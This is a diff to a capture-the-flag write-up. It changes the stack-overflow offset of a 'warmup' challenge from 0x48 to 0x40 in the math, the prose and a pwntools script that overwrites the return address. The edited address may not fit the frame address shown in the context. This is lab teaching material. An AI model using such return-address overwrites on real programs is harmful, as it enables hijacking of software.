@@ -150,11 +150,11 @@ Stack level 0, frame at 0x7fffffffdea0:
 
 With a bit of math, we see the offset:
 ```
->>> hex(0x7fffffffde98 - 0x7fffffffde50)
-'0x48'
+>>> hex(0x7fffffffde90 - 0x7fffffffde50)
+'0x40'
 ```
 
-So we can see that after `0x48` bytes of input, we start overwriting the return address. With all of this, we can write the exploit;
+So we can see that after `0x40` bytes of input, we start overwriting the return address. With all of this, we can write the exploit;
 ```
 from pwn import *
 
@@ -163,7 +163,7 @@ target = process('./warmup')
 
 # Make the payload
 payload = ""
-payload += "0"*0x48 # Overflow the buffer up to the return address
+payload += "0"*0x40 # Overflow the buffer up to the return address
 payload += p64(0x40060d) # Overwrite the return address with the address of the `easy` function
 
 # Send the payload
@@ -182,5 +182,3 @@ WOW:0x40060d
 >flag{g0ttem_b0yz}
 [*] Got EOF while reading in interactive
 ```
-
-Just like that, we got the flag! As a sidenote, I've heard of instances where in certain enviornments the offset is `0x40` instead of `0x48`.
